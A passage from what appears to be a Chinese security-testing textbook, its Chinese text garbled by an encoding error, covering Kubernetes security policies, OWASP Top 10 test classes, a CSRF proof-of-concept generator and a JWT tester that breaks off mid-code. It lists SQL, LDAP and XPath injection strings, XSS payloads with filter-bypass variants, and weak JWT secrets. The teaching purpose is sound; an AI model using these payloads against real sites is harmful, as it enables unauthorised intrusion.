  name: security-webhook
webhooks:
  - name: validate.security.io
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: ["apps", ""]
        apiVersions: ["v1"]
        resources: ["deployments", "pods"]
    clientConfig:
      service:
        name: security-webhook
        namespace: security
        path: "/validate"
    admissionReviewVersions: ["v1", "v1beta1"]
    sideEffects: None
    failurePolicy: Fail
''',
            
            'pod_security_policy': '''
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: true
''',
            
            'network_policies': '''
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress
spec:
  podSelector: {}
  policyTypes:
  - Ingress
'''
        }
    
    def security_metrics_and_monitoring(self):
        """å®‰å…¨æŒ‡æ ‡å’Œç›‘æ§"""
        return {
            'metrics': {
                'vulnerability_metrics': [
                    'mean_time_to_remediate',
                    'vulnerability_density',
                    'patch_coverage',
                    'false_positive_rate'
                ],
                'process_metrics': [
                    'security_test_coverage',
                    'security_gate_pass_rate',
                    'security_debt_ratio',
                    'compliance_score'
                ]
            },
            
            'dashboards': '''
# Grafana Dashboard JSON
{
  "dashboard": {
    "title": "Security Metrics",
    "panels": [
      {
        "title": "Vulnerability Trends",
        "targets": [
          {
            "expr": "sum(vulnerabilities_total) by (severity)"
          }
        ]
      },
      {
        "title": "MTTR by Severity",
        "targets": [
          {
            "expr": "avg(remediation_time_hours) by (severity)"
          }
        ]
      },
      {
        "title": "Security Gate Performance",
        "targets": [
          {
            "expr": "rate(security_gate_failures_total[5m])"
          }
        ]
      }
    ]
  }
}
''',
            
            'alerts': '''
# Prometheuså‘Šè­¦è§„åˆ™
groups:
  - name: security
    rules:
      - alert: CriticalVulnerability
        expr: vulnerabilities_total{severity="critical"} > 0
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Critical vulnerability detected"
          
      - alert: SecurityGateFailureRate
        expr: rate(security_gate_failures_total[1h]) > 0.1
        for: 15m
        labels:
          severity: warning
        annotations:
          summary: "High security gate failure rate"
'''
        }
    
    def team_enablement(self):
        """å›¢é˜Ÿèµ‹èƒ½"""
        return {
            'training': {
                'security_champions': 'æ¯ä¸ªå›¢é˜Ÿçš„å®‰å…¨å€¡å¯¼è€…',
                'regular_workshops': 'å®šæœŸå®‰å…¨å·¥ä½œåŠ',
                'gamification': 'å®‰å…¨ç«èµ›å’ŒCTF'
            },
            
            'documentation': {
                'security_playbooks': 'å®‰å…¨æ“ä½œæ‰‹å†Œ',
                'threat_modeling_guides': 'å¨èƒå»ºæ¨¡æŒ‡å—',
                'secure_coding_standards': 'å®‰å…¨ç¼–ç æ ‡å‡†'
            },
            
            'automation': {
                'self_service_security': 'è‡ªåŠ©å®‰å…¨æ‰«æ',
                'automated_remediation': 'è‡ªåŠ¨ä¿®å¤è„šæœ¬',
                'security_as_code': 'å®‰å…¨ç­–ç•¥ä»£ç åŒ–'
            }
        }

# å®æ–½è®¡åˆ’
def implementation_roadmap():
    return {
        'phase1_foundation': {
            'duration': '1-2 months',
            'activities': [
                'å·¥å…·é€‰å‹å’Œé‡‡è´­',
                'åŸºç¡€è®¾æ–½æ­å»º',
                'å›¢é˜ŸåŸ¹è®­',
                'piloté¡¹ç›®é€‰æ‹©'
            ]
        },
        
        'phase2_integration': {
            'duration': '2-3 months',
            'activities': [
                'CI/CDé›†æˆ',
                'è‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•',
                'ç›‘æ§å’Œå‘Šè­¦è®¾ç½®',
                'æµç¨‹ä¼˜åŒ–'
            ]
        },
        
        'phase3_optimization': {
            'duration': '3-6 months',
            'activities': [
                'æ€§èƒ½è°ƒä¼˜',
                'è¯¯æŠ¥ç‡é™ä½',
                'é«˜çº§åŠŸèƒ½å¯ç”¨',
                'å…¨é¢æ¨å¹¿'
            ]
        },
        
        'phase4_maturity': {
            'duration': 'Ongoing',
            'activities': [
                'æŒç»­æ”¹è¿›',
                'æ–°æŠ€æœ¯é‡‡ç”¨',
                'å®‰å…¨æ–‡åŒ–å»ºè®¾',
                'è¡Œä¸šé¢†å…ˆå®è·µ'
            ]
        }
    }
```

å…³é”®æˆåŠŸå› ç´ ï¼š
1. **è‡ªåŠ¨åŒ–ä¼˜å…ˆ**ï¼šæœ€å¤§ç¨‹åº¦è‡ªåŠ¨åŒ–å®‰å…¨æ£€æŸ¥
2. **å¼€å‘è€…å‹å¥½**ï¼šæä¾›æ¸…æ™°çš„åé¦ˆå’Œä¿®å¤å»ºè®®
3. **å¢é‡å®æ–½**ï¼šé€æ­¥å¢åŠ å®‰å…¨æ§åˆ¶
4. **åº¦é‡é©±åŠ¨**ï¼šç”¨æ•°æ®è¯´è¯ï¼ŒæŒç»­æ”¹è¿›
5. **æ–‡åŒ–å»ºè®¾**ï¼šå®‰å…¨æ˜¯æ¯ä¸ªäººçš„è´£ä»»

</details>

### è¿›ä¸€æ­¥ç ”ç©¶

1. å¦‚ä½•ä½¿ç”¨AIæŠ€æœ¯æå‡å®‰å…¨æµ‹è¯•çš„æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼Ÿ
2. é›¶ä¿¡ä»»æ¶æ„å¯¹å®‰å…¨æµ‹è¯•ç­–ç•¥çš„å½±å“æ˜¯ä»€ä¹ˆï¼Ÿ
3. å¦‚ä½•è®¾è®¡é€‚ç”¨äºå¾®æœåŠ¡æ¶æ„çš„å®‰å…¨æµ‹è¯•æ–¹æ³•ï¼Ÿ

## 17.4 Webåº”ç”¨å®‰å…¨æµ‹è¯•

### 17.4.1 OWASP Top 10æµ‹è¯•

é’ˆå¯¹æœ€å¸¸è§çš„Webåº”ç”¨å®‰å…¨é£é™©è¿›è¡Œç³»ç»Ÿæµ‹è¯•ï¼š

```python
class OWASPTop10Tester:
    def __init__(self):
        self.test_cases = {
            'A01_2021': self.test_broken_access_control,
            'A02_2021': self.test_cryptographic_failures,
            'A03_2021': self.test_injection,
            'A04_2021': self.test_insecure_design,
            'A05_2021': self.test_security_misconfiguration,
            'A06_2021': self.test_vulnerable_components,
            'A07_2021': self.test_identification_failures,
            'A08_2021': self.test_data_integrity_failures,
            'A09_2021': self.test_logging_failures,
            'A10_2021': self.test_ssrf
        }
    
    def test_broken_access_control(self, target):
        """A01:2021 - æƒé™æ§åˆ¶å¤±æ•ˆ"""
        vulnerabilities = []
        
        # å‚ç›´æƒé™æå‡æµ‹è¯•
        vertical_tests = [
            # æ™®é€šç”¨æˆ·è®¿é—®ç®¡ç†å‘˜åŠŸèƒ½
            {'user': 'normal_user', 'endpoint': '/admin/users'},
            # ä¿®æ”¹å…¶ä»–ç”¨æˆ·æ•°æ®
            {'user': 'user1', 'endpoint': '/api/users/2/profile'},
        ]
        
        # æ°´å¹³æƒé™è¶Šæƒæµ‹è¯•
        horizontal_tests = [
            # è®¿é—®å…¶ä»–ç”¨æˆ·çš„è®¢å•
            {'user': 'user1', 'endpoint': '/api/orders/user2_order_123'},
            # ä¸‹è½½å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶
            {'user': 'user1', 'endpoint': '/api/files/user2_private.pdf'},
        ]
        
        # å¼ºåˆ¶æµè§ˆæµ‹è¯•
        forced_browsing = [
            '/backup/', '/admin/', '/config/', '/.git/',
            '/api/v1/internal/', '/debug/', '/test/'
        ]
        
        return vulnerabilities
    
    def test_injection(self, target):
        """A03:2021 - æ³¨å…¥æ”»å‡»"""
        injection_points = []
        
        # SQLæ³¨å…¥å˜ä½“
        sql_variants = {
            'union_based': ["' UNION SELECT NULL,NULL,NULL--"],
            'boolean_based': ["' AND '1'='1", "' AND '1'='2"],
            'time_based': ["'; WAITFOR DELAY '00:00:05'--"],
            'error_based': ["' AND 1=CONVERT(int, @@version)--"],
            'stacked_queries': ["'; INSERT INTO logs VALUES('test')--"],
            'second_order': ["admin'--"]  # å­˜å‚¨åè§¦å‘
        }
        
        # LDAPæ³¨å…¥
        ldap_payloads = [
            '*)(uid=*)',
            'admin)(&(password=*)',
            '*)(|(uid=*'
        ]
        
        # XPathæ³¨å…¥
        xpath_payloads = [
            "' or '1'='1",
            "'] | //user/*",
            "' or count(//user[password])>0 or '"
        ]
        
        return injection_points
```

### 17.4.2 è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æµ‹è¯•

å…¨é¢çš„XSSæµ‹è¯•ç­–ç•¥ï¼š

```python
class XSSDetector:
    def __init__(self):
        self.contexts = {
            'html': self.html_context_payloads,
            'attribute': self.attribute_context_payloads,
            'javascript': self.js_context_payloads,
            'url': self.url_context_payloads,
            'css': self.css_context_payloads
        }
        
    def generate_xss_payloads(self, context='html'):
        """æ ¹æ®ä¸Šä¸‹æ–‡ç”ŸæˆXSSè½½è·"""
        base_payloads = {
            'html': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>'
            ],
            
            'attribute': [
                '" onmouseover="alert(1)',
                '" autofocus onfocus=alert(1) x="',
                '"><script>alert(1)</script>',
                '" style="behavior:url(#default#time2)" onbegin="alert(1)" "',
                '" onclick="alert(1)" x="'
            ],
            
            'javascript': [
                '";alert(1)//',
                '\';alert(1)//',
                '\\";alert(1)//',
                '</script><script>alert(1)</script>',
                '`;alert(1)//`',
                '${alert(1)}',
                '\\u0027;alert(1)//\\u0027'
            ],
            
            'url': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert%281%29',
                'java\nscript:alert(1)',
                'javascript\t:alert(1)',
                'javascript&#58;alert(1)',
                'javascript&#x3A;alert(1)'
            ]
        }
        
        return base_payloads.get(context, [])
    
    def test_filter_bypass(self, endpoint, filters):
        """æµ‹è¯•XSSè¿‡æ»¤å™¨ç»•è¿‡"""
        bypass_techniques = {
            'encoding': [
                # HTMLå®ä½“ç¼–ç 
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
                
                # URLç¼–ç 
                '%3Cscript%3Ealert(1)%3C/script%3E',
                
                # Unicodeç¼–ç 
                '\u003cscript\u003ealert(1)\u003c/script\u003e',
                
                # æ··åˆç¼–ç 
                '<scr&#x69;pt>alert(1)</scr&#x69;pt>'
            ],
            
            'case_variation': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<SCRIPT>alert(1)</SCRIPT>',
                '<sCrIpT>alert(1)</sCrIpT>'
            ],
            
            'tag_breaking': [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<<script>script>alert(1)<</script>/script>',
                '<scri\\x00pt>alert(1)</scri\\x00pt>'
            ],
            
            'event_handler_variations': [
                '<img src=x onerror=\\u0061lert(1)>',
                '<img src=x on\nerror=alert(1)>',
                '<img src=x on error=alert(1)>',
                '<img src=x onerror =alert(1)>',
                '<img src=x onerror= alert(1)>'
            ]
        }
        
        return bypass_techniques
```

### 17.4.3 è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æµ‹è¯•

```python
class CSRFTester:
    def __init__(self):
        self.csrf_patterns = []
        self.state_changing_operations = []
        
    def identify_csrf_vulnerabilities(self, app):
        """è¯†åˆ«CSRFæ¼æ´"""
        vulnerabilities = []
        
        # æŸ¥æ‰¾çŠ¶æ€æ”¹å˜æ“ä½œ
        state_changing_endpoints = self.find_state_changing_endpoints(app)
        
        for endpoint in state_changing_endpoints:
            # æ£€æŸ¥CSRFä¿æŠ¤
            if not self.has_csrf_protection(endpoint):
                # ç”ŸæˆCSRF PoC
                poc = self.generate_csrf_poc(endpoint)
                
                vulnerabilities.append({
                    'endpoint': endpoint,
                    'method': endpoint.method,
                    'poc': poc,
                    'severity': self.calculate_severity(endpoint)
                })
        
        return vulnerabilities
    
    def generate_csrf_poc(self, endpoint):
        """ç”ŸæˆCSRFæ¦‚å¿µéªŒè¯ä»£ç """
        if endpoint.method == 'POST':
            poc = f'''
<html>
<body>
<form action="{endpoint.url}" method="POST">
    {self.generate_form_fields(endpoint.parameters)}
    <input type="submit" value="Submit">
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
'''
        elif endpoint.method == 'GET':
            poc = f'''
<html>
<body>
<img src="{endpoint.url}?{self.generate_query_string(endpoint.parameters)}">
</body>
</html>
'''
        
        return poc
    
    def test_csrf_token_bypass(self, endpoint):
        """æµ‹è¯•CSRFä»¤ç‰Œç»•è¿‡"""
        bypass_attempts = [
            # ç©ºä»¤ç‰Œ
            {'csrf_token': ''},
            # ç§»é™¤ä»¤ç‰Œ
            {'remove': 'csrf_token'},
            # ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„ä»¤ç‰Œ
            {'csrf_token': self.get_other_user_token()},
            # å›ºå®šä»¤ç‰Œ
            {'csrf_token': 'aaaaaaaaaaaaaaaaaaaa'},
            # ä»¤ç‰Œé•¿åº¦æ”»å‡»
            {'csrf_token': 'a' * 1000},
            # ä»¤ç‰Œç±»å‹æ··æ·†
            {'csrf_token': 12345},
        ]
        
        return bypass_attempts
```

### 17.4.4 ä¼šè¯ç®¡ç†æµ‹è¯•

```python
class SessionManagementTester:
    def __init__(self):
        self.session_tests = {
            'fixation': self.test_session_fixation,
            'hijacking': self.test_session_hijacking,
            'timeout': self.test_session_timeout,
            'concurrent': self.test_concurrent_sessions,
            'invalidation': self.test_session_invalidation
        }
    
    def test_session_security(self, app):
        """å…¨é¢çš„ä¼šè¯å®‰å…¨æµ‹è¯•"""
        results = {}
        
        # ä¼šè¯æ ‡è¯†ç¬¦åˆ†æ
        session_analysis = self.analyze_session_identifier(app)
        results['identifier_security'] = session_analysis
        
        # ä¼šè¯ç®¡ç†æµ‹è¯•
        for test_name, test_func in self.session_tests.items():
            results[test_name] = test_func(app)
        
        return results
    
    def analyze_session_identifier(self, app):
        """åˆ†æä¼šè¯æ ‡è¯†ç¬¦çš„å®‰å…¨æ€§"""
        session_ids = self.collect_session_ids(app, count=100)
        
        analysis = {
            'randomness': self.test_randomness(session_ids),
            'length': self.analyze_length(session_ids),
            'charset': self.analyze_charset(session_ids),
            'predictability': self.test_predictability(session_ids),
            'uniqueness': self.test_uniqueness(session_ids)
        }
        
        return analysis
    
    def test_session_fixation(self, app):
        """ä¼šè¯å›ºå®šæ”»å‡»æµ‹è¯•"""
        # 1. è·å–æœªè®¤è¯çš„ä¼šè¯ID
        pre_auth_session = self.get_session(app)
        
        # 2. ä½¿ç”¨è¯¥ä¼šè¯IDè¿›è¡Œç™»å½•
        self.login_with_session(app, pre_auth_session)
        
        # 3. æ£€æŸ¥ä¼šè¯IDæ˜¯å¦æ”¹å˜
        post_auth_session = self.get_current_session(app)
        
        if pre_auth_session == post_auth_session:
            return {
                'vulnerable': True,
                'description': 'Session ID not regenerated after login',
                'severity': 'High'
            }
        
        return {'vulnerable': False}
```

### ç»ƒä¹  17.4

1. **è®¾è®¡é¢˜**ï¼šè®¾è®¡ä¸€ä¸ªDOM XSSæ£€æµ‹å™¨ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

DOM XSSæ£€æµ‹å™¨è®¾è®¡ï¼š

```python
import re
from urllib.parse import urlparse, parse_qs
import json

class DOMXSSDetector:
    def __init__(self):
        # DOM XSSæ±‡ç‚¹ï¼ˆsinksï¼‰
        self.dangerous_sinks = {
            'execution': [
                'eval', 'setTimeout', 'setInterval', 'Function',
                'execScript', 'setImmediate'
            ],
            'html_modification': [
                'innerHTML', 'outerHTML', 'document.write',
                'document.writeln', 'insertAdjacentHTML'
            ],
            'url_manipulation': [
                'location', 'location.href', 'location.replace',
                'location.assign', 'window.open'
            ],
            'script_src': [
                'script.src', 'script.textContent', 'script.text',
                'script.innerText', 'script.innerHTML'
            ],
            'event_handlers': [
                'onclick', 'onload', 'onerror', 'onmouseover',
                'onfocus', 'onblur', 'onchange'
            ]
        }
        
        # DOM XSSæºï¼ˆsourcesï¼‰
        self.taint_sources = [
            'location.search', 'location.hash', 'location.pathname',
            'location.href', 'document.URL', 'document.documentURI',
            'document.baseURI', 'document.referrer', 'document.cookie',
            'window.name', 'history.pushState', 'history.replaceState',
            'localStorage', 'sessionStorage', 'IndexedDB'
        ]
        
        self.payloads = self.generate_dom_payloads()
        
    def scan_javascript(self, js_code, url):
        """æ‰«æJavaScriptä»£ç æŸ¥æ‰¾DOM XSSæ¼æ´"""
        vulnerabilities = []
        
        # 1. é™æ€åˆ†æ
        static_vulns = self.static_analysis(js_code)
        vulnerabilities.extend(static_vulns)
        
        # 2. æ•°æ®æµåˆ†æ
        dataflow_vulns = self.dataflow_analysis(js_code)
        vulnerabilities.extend(dataflow_vulns)
        
        # 3. åŠ¨æ€åˆ†æï¼ˆå¦‚æœå¯èƒ½ï¼‰
        if self.can_execute_safely(js_code):
            dynamic_vulns = self.dynamic_analysis(js_code, url)
            vulnerabilities.extend(dynamic_vulns)
        
        return vulnerabilities
    
    def static_analysis(self, js_code):
        """é™æ€ä»£ç åˆ†æ"""
        vulnerabilities = []
        
        # æŸ¥æ‰¾å±é™©çš„æ¨¡å¼
        patterns = {
            # ç›´æ¥ä½¿ç”¨location.search
            r'innerHTML\s*=\s*.*location\.search': {
                'type': 'Direct innerHTML from URL',
                'severity': 'High'
            },
            # evalä½¿ç”¨URLå‚æ•°
            r'eval\s*\(.*location\.(search|hash)': {
                'type': 'eval with URL parameter',
                'severity': 'Critical'
            },
            # åŠ¨æ€è„šæœ¬åˆ›å»º
            r'createElement\s*\(\s*["\']script["\']\s*\)': {
                'type': 'Dynamic script creation',
                'severity': 'Medium'
            },
            # jQueryçš„html()æ–¹æ³•
            r'\$\s*\(.*\)\.html\s*\(.*location': {
                'type': 'jQuery html() with URL data',
                'severity': 'High'
            }
        }
        
        for pattern, details in patterns.items():
            matches = re.finditer(pattern, js_code, re.IGNORECASE)
            for match in matches:
                vulnerabilities.append({
                    'type': 'DOM XSS',
                    'pattern': pattern,
                    'match': match.group(),
                    'position': match.span(),
                    **details
                })
        
        return vulnerabilities
    
    def dataflow_analysis(self, js_code):
        """æ•°æ®æµåˆ†æè¿½è¸ªæ±¡ç‚¹ä¼ æ’­"""
        vulnerabilities = []
        
        # ç®€åŒ–çš„æ±¡ç‚¹åˆ†æ
        taint_graph = TaintGraph()
        
        # è¯†åˆ«æº
        for source in self.taint_sources:
            source_uses = self.find_source_uses(js_code, source)
            for use in source_uses:
                taint_graph.add_source(use['variable'], source, use['line'])
        
        # è¿½è¸ªä¼ æ’­
        assignments = self.extract_assignments(js_code)
        for assignment in assignments:
            if taint_graph.is_tainted(assignment['rhs']):
                taint_graph.propagate(assignment['lhs'], assignment['rhs'])
        
        # æ£€æŸ¥æ±‡ç‚¹
        for sink_category, sinks in self.dangerous_sinks.items():
            for sink in sinks:
                sink_uses = self.find_sink_uses(js_code, sink)
                for use in sink_uses:
                    if taint_graph.reaches_sink(use['argument'], sink):
                        vulnerabilities.append({
                            'type': 'DOM XSS via ' + sink_category,
                            'source': taint_graph.get_source(use['argument']),
                            'sink': sink,
                            'flow': taint_graph.get_path(use['argument'], sink),
                            'severity': 'High'
                        })
        
        return vulnerabilities
    
    def dynamic_analysis(self, js_code, url):
        """åŠ¨æ€æ‰§è¡Œåˆ†æ"""
        vulnerabilities = []
        
        # ä½¿ç”¨headlessæµè§ˆå™¨
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        
        driver = webdriver.Chrome(options=options)
        
        try:
            # æ³¨å…¥ç›‘æ§ä»£ç 
            monitor_code = self.generate_monitor_code()
            
            # æµ‹è¯•æ¯ä¸ªpayload
            for payload in self.payloads:
                # æ„é€ æµ‹è¯•URL
                test_url = self.inject_payload(url, payload)
                
                # è®¿é—®é¡µé¢
                driver.get(test_url)
                
                # æ³¨å…¥ç›‘æ§
                driver.execute_script(monitor_code)
                
                # ç­‰å¾…æ‰§è¡Œ
                driver.implicitly_wait(2)
                
                # æ£€æŸ¥æ˜¯å¦è§¦å‘
                result = driver.execute_script('return window.__xss_triggered')
                
                if result:
                    vulnerabilities.append({
                        'type': 'DOM XSS (Confirmed)',
                        'payload': payload,
                        'url': test_url,
                        'trigger': result,
                        'severity': 'Critical'
                    })
                    
        finally:
            driver.quit()
        
        return vulnerabilities
    
    def generate_monitor_code(self):
        """ç”ŸæˆXSSç›‘æ§ä»£ç """
        return '''
        window.__xss_triggered = false;
        window.__original_alert = window.alert;
        
        // ç›‘æ§å¸¸è§çš„XSSè§¦å‘
        window.alert = function(msg) {
            window.__xss_triggered = {
                type: 'alert',
                message: msg,
                stack: new Error().stack
            };
        };
        
        // ç›‘æ§eval
        var originalEval = window.eval;
        window.eval = function(code) {
            if (code.includes('alert') || code.includes('xss')) {
                window.__xss_triggered = {
                    type: 'eval',
                    code: code
                };
            }
            return originalEval.apply(this, arguments);
        };
        
        // ç›‘æ§innerHTML
        Object.defineProperty(Element.prototype, 'innerHTML', {
            set: function(value) {
                if (value.includes('<script') || value.includes('onerror')) {
                    window.__xss_triggered = {
                        type: 'innerHTML',
                        value: value
                    };
                }
                this.innerHTML = value;
            }
        });
        '''
    
    def generate_dom_payloads(self):
        """ç”ŸæˆDOM XSSæµ‹è¯•è½½è·"""
        payloads = []
        
        # URLå‚æ•°è½½è·
        url_payloads = [
            '#<img src=x onerror=alert(1)>',
            '#<script>alert(1)</script>',
            '#javascript:alert(1)',
            '?name=<img src=x onerror=alert(1)>',
            '?search=</script><script>alert(1)</script>',
            '?q=\'-alert(1)-\'',
            '?id=1;alert(1)',
            '#<svg onload=alert(1)>',
            '?callback=alert',
            '?redirect=javascript:alert(1)'
        ]
        
        # ç‰¹æ®Šç¼–ç è½½è·
        encoded_payloads = [
            '#%3Cimg%20src=x%20onerror=alert(1)%3E',
            '?q=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E',
            '#\\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003dalert(1)\\u003e',
            '?input=\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'
        ]
        
        # DOMæ“ä½œè½½è·
        dom_payloads = [
            '?page=\\"-alert(1)-\\"',
            '#\';alert(1);//',
            '?sort=name\\u0027);alert(1);//',
            '?filter=test%27%2Balert(1)%2B%27',
            '#${alert(1)}',
            '?tpl={{constructor.constructor(\\\'alert(1)\\\')()}}'
        ]
        
        payloads.extend(url_payloads)
        payloads.extend(encoded_payloads)
        payloads.extend(dom_payloads)
        
        return payloads
    
    def find_source_uses(self, js_code, source):
        """æŸ¥æ‰¾æ±¡ç‚¹æºçš„ä½¿ç”¨"""
        uses = []
        
        # ç®€å•çš„æ­£åˆ™åŒ¹é…ï¼ˆå®é™…åº”ä½¿ç”¨ASTï¼‰
        pattern = rf'(\w+)\s*=\s*{re.escape(source)}'
        matches = re.finditer(pattern, js_code)
        
        for match in matches:
            uses.append({
                'variable': match.group(1),
                'source': source,
                'line': js_code[:match.start()].count('\n') + 1
            })
        
        return uses
    
    def find_sink_uses(self, js_code, sink):
        """æŸ¥æ‰¾å±é™©æ±‡ç‚¹çš„ä½¿ç”¨"""
        uses = []
        
        # æŸ¥æ‰¾ä¸åŒå½¢å¼çš„ä½¿ç”¨
        patterns = [
            rf'{re.escape(sink)}\s*\((.*?)\)',  # å‡½æ•°è°ƒç”¨
            rf'{re.escape(sink)}\s*=\s*(.*?);',  # èµ‹å€¼
            rf'\.{re.escape(sink)}\s*=\s*(.*?);'  # å±æ€§èµ‹å€¼
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, js_code, re.DOTALL)
            for match in matches:
                uses.append({
                    'sink': sink,
                    'argument': match.group(1).strip(),
                    'line': js_code[:match.start()].count('\n') + 1
                })
        
        return uses

class TaintGraph:
    """æ±¡ç‚¹ä¼ æ’­å›¾"""
    def __init__(self):
        self.tainted_vars = {}  # variable -> source
        self.propagations = []  # (from, to) edges
        
    def add_source(self, variable, source, line):
        self.tainted_vars[variable] = {
            'source': source,
            'line': line
        }
    
    def propagate(self, to_var, from_var):
        if from_var in self.tainted_vars:
            self.tainted_vars[to_var] = self.tainted_vars[from_var]
            self.propagations.append((from_var, to_var))
    
    def is_tainted(self, variable):
        return variable in self.tainted_vars
    
    def reaches_sink(self, variable, sink):
        return self.is_tainted(variable)
    
    def get_source(self, variable):
        if variable in self.tainted_vars:
            return self.tainted_vars[variable]['source']
        return None
    
    def get_path(self, variable, sink):
        # ç®€åŒ–çš„è·¯å¾„è¿½è¸ª
        path = []
        current = variable
        
        while current in self.tainted_vars:
            path.append(current)
            # æŸ¥æ‰¾æ˜¯å¦æœ‰ä¼ æ’­åˆ°å½“å‰å˜é‡çš„
            for from_var, to_var in self.propagations:
                if to_var == current:
                    current = from_var
                    break
            else:
                break
        
        path.reverse()
        return ' -> '.join(path) + f' -> {sink}'

# ä½¿ç”¨ç¤ºä¾‹
def scan_website_for_dom_xss(url):
    detector = DOMXSSDetector()
    
    # è·å–æ‰€æœ‰JavaScriptæ–‡ä»¶
    js_files = fetch_javascript_files(url)
    
    all_vulnerabilities = []
    
    for js_file in js_files:
        js_content = fetch_content(js_file['url'])
        vulnerabilities = detector.scan_javascript(js_content, url)
        
        if vulnerabilities:
            all_vulnerabilities.extend({
                'file': js_file['url'],
                'vulnerabilities': vulnerabilities
            })
    
    # ç”ŸæˆæŠ¥å‘Š
    generate_dom_xss_report(all_vulnerabilities)
    
    return all_vulnerabilities
```

è¿™ä¸ªDOM XSSæ£€æµ‹å™¨åŒ…å«ï¼š
1. é™æ€ä»£ç åˆ†æ
2. æ•°æ®æµæ±¡ç‚¹åˆ†æ
3. åŠ¨æ€æ‰§è¡ŒéªŒè¯
4. å¤šç§payloadç”Ÿæˆ
5. æºåˆ°æ±‡çš„è¿½è¸ª

</details>

2. **å®è·µé¢˜**ï¼šå¦‚ä½•æµ‹è¯•JWTçš„å®‰å…¨æ€§ï¼Ÿ

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

JWTå®‰å…¨æ€§æµ‹è¯•æ–¹æ³•ï¼š

```python
import jwt
import json
import base64
import hmac
import hashlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

class JWTSecurityTester:
    def __init__(self):
        self.common_secrets = [
            'secret', 'password', 'key', '123456', 'jwt-secret',
            'your-256-bit-secret', 'HS256', 'secret-key',
            'super-secret', 'my-secret-key'
        ]
        
        self.test_results = []
    
    def comprehensive_jwt_test(self, jwt_token):
        """å…¨é¢çš„JWTå®‰å…¨æµ‹è¯•"""
        print("Starting JWT Security Analysis...")
        
        # 1. è§£æJWT
        header, payload, signature = self.parse_jwt(jwt_token)
        
        # 2. åŸºç¡€åˆ†æ
        self.analyze_jwt_structure(header, payload)
        
        # 3. ç®—æ³•ç›¸å…³æ”»å‡»
        self.test_algorithm_attacks(jwt_token, header)
        
        # 4. å¯†é’¥ç›¸å…³æ”»å‡»
        self.test_key_attacks(jwt_token, header)
        
        # 5. æ—¶é—´ç›¸å…³æµ‹è¯•
        self.test_time_claims(payload)
        
        # 6. æƒé™å’Œå†…å®¹æµ‹è¯•
        self.test_claim_tampering(jwt_token, payload)
        
        # 7. å®ç°ç¼ºé™·æµ‹è¯•
        self.test_implementation_flaws(jwt_token)
        
        return self.generate_report()
    
    def parse_jwt(self, token):
        """è§£æJWT token"""
        parts = token.split('.')
        
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        # è§£ç headerå’Œpayload
        header = json.loads(self.base64_decode(parts[0]))
        payload = json.loads(self.base64_decode(parts[1]))
        signature = parts[2]
        
        return header, payload, signature
    
    def base64_decode(self, data):
        """Base64è§£ç ï¼ˆå¤„ç†paddingï¼‰"""
        # æ·»åŠ å¿…è¦çš„padding
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        return base64.urlsafe_b64decode(data)
    
    def test_algorithm_attacks(self, token, header):
        """æµ‹è¯•ç®—æ³•ç›¸å…³çš„æ”»å‡»"""
        
        # 1. Noneç®—æ³•æ”»å‡»
        self.test_none_algorithm(token)
        
        # 2. ç®—æ³•æ··æ·†æ”»å‡»ï¼ˆRS256 -> HS256ï¼‰
        if header.get('alg') == 'RS256':
            self.test_algorithm_confusion(token)
        
        # 3. å¼±ç®—æ³•æ£€æµ‹
        self.test_weak_algorithms(header)
    
    def test_none_algorithm(self, token):
        """æµ‹è¯•noneç®—æ³•ç»•è¿‡"""
        parts = token.split('.')
        
        # ä¿®æ”¹headerä½¿ç”¨noneç®—æ³•
        header = json.loads(self.base64_decode(parts[0]))
        header['alg'] = 'none'
        
        # é‡æ–°ç¼–ç 
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        # åˆ›å»ºæ²¡æœ‰ç­¾åçš„token
        none_token = f"{new_header}.{parts[1]}."
        
        self.test_results.append({
            'test': 'None Algorithm',
            'payload': none_token,
